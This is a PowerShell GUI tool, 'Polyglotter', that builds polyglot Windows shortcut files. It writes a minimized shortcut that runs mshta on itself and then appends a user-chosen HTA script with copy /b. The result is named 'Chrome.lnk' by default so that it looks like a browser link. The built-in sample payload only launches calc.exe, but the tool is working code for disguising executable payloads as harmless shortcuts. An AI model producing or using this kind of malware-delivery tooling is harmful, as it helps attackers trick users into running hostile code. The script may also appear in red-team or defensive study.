#
#
# Polyglotter v0.1b (C) 2024 - by suuhm
# (C) 2024 by suuhm (https://github.com/suuhm)
#
# Automatic and ez creating of polyglot *lnk files in Windows
#
# More info here: https://www.youtube.com/watch?v=RLtMxN5q_cQ
#
# ------------------------------------------------------------------------
#
# Credits and big thanks for this inspiration goes out to John Hammond!
#  
#

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

#
# Searching for *.hta Datei
#
function SelectHTAFile {
    $openFileDialog = New-Object System.Windows.Forms.OpenFileDialog
    $openFileDialog.Filter = "HTA files (*.hta)|*.hta|All files (*.*)|*.*"
    $openFileDialog.InitialDirectory = [System.Environment]::GetFolderPath('Desktop')
    $openFileDialog.Title = "Select HTA File"

    $result = $openFileDialog.ShowDialog()

    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        return $openFileDialog.FileName
    }

    return $null
}

#
# Common script:
#

#
# NAME OF THE OUTPUT LNK FILE:
#
if (-not $TextBoxChromeLink.Text) {
    $__OUTPUT_LNK = "Chr0m3.lnk"
} else {
    $__OUTPUT_LNK = $TextBoxChromeLink.Text
}

#
# Setup Iconset of shell32.dll with index icon 4
#
$__SHCULO_ICON = "%SystemRoot%\system32\SHELL32.dll,4"


function StartScript {
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')

    if (-not $HTAFilePath) {
        $HTAFilePath = "payload.hta"

        Write-Host "Please select an HTA file first. Using Dummy MessageBox!"
        $htaContent = @"
<hta:application windowstate="minimize">
<script language="VBScript">
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "calc.exe", 0, False

MsgBox "Hello mad World"
Close
</script>
"@
        $htaPath = Join-Path -Path $desktopPath -ChildPath $HTAFilePath
        $htaContent | Out-File -FilePath $htaPath -Encoding utf8
        #return
    }

    $htaPath = $HTAFilePath

    if (-not $exePath) {
        $exePath = "calc.exe"
    }

    # new lnk
    $shortcutPath = Join-Path -Path $desktopPath -ChildPath "blueprint.lnk"
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "cmd.exe"
    $shortcut.Arguments = "/c mshta %CD%\$__OUTPUT_LNK"
    $shortcut.WorkingDirectory = "%CD%"
    $shortcut.WindowStyle = 7 # "Minimized"
    $shortcut.IconLocation = $__SHCULO_ICON
    $shortcut.Save()

    #$chromeLinkPath = Join-Path -Path $desktopPath -ChildPath "Chrome.lnk"
    #Copy-Item -Path $shortcutPath -Destination $chromeLinkPath
    #Copy-Item -Path $htaPath -Destination $chromeLinkPath -PassThru | Out-Null
    cd $desktopPath
    cmd.exe /c copy /b %CD%\blueprint.lnk+$htaPath $__OUTPUT_LNK

    Write-Host "Done. Create file on $desktopPath\$__OUTPUT_LNK and delete temp files"

    # Garbage Delete files:
    Remove-Item -Verbose $desktopPath\blueprint.lnk
    Remove-Item -Verbose $desktopPath\payload.hta

}


#
# Create GUI
#
$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Polyglotter v0.1b (C) 2024 - by suuhm"
$iconPath = "$env:SystemRoot\system32\calc.exe"
$iconIndex = 4
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconPath)
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconPath).ToBitmap()
$Form.Icon = [System.Drawing.Icon]::FromHandle($icon.GetHicon())
#$Form.Icon = "%SystemRoot%\system32\SHELL32.dll,4"

$Form.Size = New-Object System.Drawing.Size(390,260)
$Form.MaximizeBox = $false
$Form.StartPosition = "CenterScreen"

$LabelBanner = New-Object System.Windows.Forms.Label
$LabelBanner.Location = New-Object System.Drawing.Point(20,10)
$LabelBanner.Size = New-Object System.Drawing.Size(450,20)
$LabelBanner.Text = "POLYGLOTTER v0.1b"
$LabelBanner.Font = New-Object System.Drawing.Font("Arial",14,[System.Drawing.FontStyle]::Bold)
$Form.Controls.Add($LabelBanner)

$LabelBanner2 = New-Object System.Windows.Forms.Label
$LabelBanner2.Location = New-Object System.Drawing.Point(20,36)
$LabelBanner2.Size = New-Object System.Drawing.Size(450,20)
$LabelBanner2.Text = "(C) 2024 by suuhm (https://github.com/suuhm)"
$LabelBanner2.Font = New-Object System.Drawing.Font("Arial",10,[System.Drawing.FontStyle]::Italic)
$Form.Controls.Add($LabelBanner2)


$LabelHTAPath = New-Object System.Windows.Forms.Label
$LabelHTAPath.Location = New-Object System.Drawing.Point(20,70)
$LabelHTAPath.Size = New-Object System.Drawing.Size(450,20)
$Form.Controls.Add($LabelHTAPath)

$ButtonSelectHTAFile = New-Object System.Windows.Forms.Button
$ButtonSelectHTAFile.Location = New-Object System.Drawing.Point(20,100)
$ButtonSelectHTAFile.Size = New-Object System.Drawing.Size(150,40)
$ButtonSelectHTAFile.Text = "Browse HTA File"
$ButtonSelectHTAFile.Add_Click({
    $global:HTAFilePath = SelectHTAFile
    if ($global:HTAFilePath) {
        $LabelHTAPath.Text = "Selected HTA file: $($global:HTAFilePath)"
    }
})
$Form.Controls.Add($ButtonSelectHTAFile)

$ButtonStartScript = New-Object System.Windows.Forms.Button
$ButtonStartScript.Location = New-Object System.Drawing.Point(200,100)
$ButtonStartScript.Size = New-Object System.Drawing.Size(150,40)
$ButtonStartScript.Text = "Start Script"
$ButtonStartScript.Add_Click({
    StartScript
})
$Form.Controls.Add($ButtonStartScript)


# Filename Label add
$TextBoxChromeLink = New-Object System.Windows.Forms.TextBox
$TextBoxChromeLink.Location = New-Object System.Drawing.Point(200, 160)
$TextBoxChromeLink.Size = New-Object System.Drawing.Size(150, 20)
$TextBoxChromeLink.Text = "Chrome.lnk"
#$global:__OUTPUT_LNK=$TextBoxChromeLink.Text
$Form.Controls.Add($TextBoxChromeLink)

$LabelName = New-Object System.Windows.Forms.Label
$LabelName.Location = New-Object System.Drawing.Point(200,185)
$LabelName.Size = New-Object System.Drawing.Size(150,20)
$LabelName.Text = "Name of Output *.lnk file"
$Form.Controls.Add($LabelName)


$ButtonExit = New-Object System.Windows.Forms.Button
$ButtonExit.Location = New-Object System.Drawing.Point(20,160)
$ButtonExit.Size = New-Object System.Drawing.Size(150,40)
$ButtonExit.Text = "Exit"
$ButtonExit.Add_Click({
    $Form.Close()
})
$Form.Controls.Add($ButtonExit)

$Form.ShowDialog() | Out-Null
